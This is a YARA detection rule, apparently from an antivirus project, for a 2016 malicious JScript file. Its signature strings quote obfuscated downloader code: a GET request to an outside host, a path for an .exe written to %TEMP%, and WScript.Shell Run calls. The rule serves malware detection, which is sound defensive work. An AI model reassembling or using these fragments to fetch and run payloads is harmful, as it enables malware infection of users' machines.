rule sig_20160328_f076c4f14dd0822f86b1054b74d37ddb {
  meta:
    description = "datamaliciousorder - file 20160328_f076c4f14dd0822f86b1054b74d37ddb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5f7301116b25126675e6142daa071b7802abc88dcd379945a90b4ac6df70e3a5"

  strings:
    $s1  = "function Dxccpcqh() {return Zaqallt[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"D1riZFJVD.exe\";};" fullword ascii
    $s2  = "Zsyft[Rbzyr](\"GET\", \"http://gettouronline.com/sd4la\", false);" fullword ascii
    $s3  = "do {WScript[Ovfzph](Xjhfywau() * 11)} while (Zsyft[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Lwbxjgmeio(Ikhtpetzs, Bifggj){return Ikhtpetzs - Bifggj;};" fullword ascii
    $s5  = "var Zaqallt = function Xwwdlez() {return WScript[Pxsndqpld](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Myztcwam(Hwfbnqwfor){Zaqallt[\"Run\"](Hwfbnqwfor, Gbqyn, Gbqyn);};" fullword ascii
    $s7  = "function Hrtgddgwf() {return ((Moyxle == true) && (Moyxle == Ureonxr)) ? 1 : Gbqyn;};" fullword ascii
    $s8  = "function Ceaos(Vzqzalcs) {var Viisb = (1, 2, 3, 4, 5, Vzqzalcs); return Viisb;};" fullword ascii
    $s9  = "var Kymnztl = new this[\"Date\"]();" fullword ascii
    $s10 = "var Moyxle = false;" fullword ascii
    $s11 = "var Ureonxr = false;" fullword ascii
    $s12 = "function Xjhfywau(){return 22;};" fullword ascii
    $s13 = "function Zztikffnv(){return Pxsndqpld;};" fullword ascii
    $s14 = "return Lwbxjgmeio(Rjput, Bvzdxsrkcp);" fullword ascii
    $s15 = "var Kpgshzyj = false;" fullword ascii
    $s16 = "function Ldocfu()" fullword ascii
    $s17 = "Ureonxr = true; " fullword ascii
    $s18 = "Moyxle = true; " fullword ascii
    $s19 = "function Qsbgeppbq(){return Pgxmlf;};" fullword ascii
    $s20 = " while (Pjleknsgtf){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}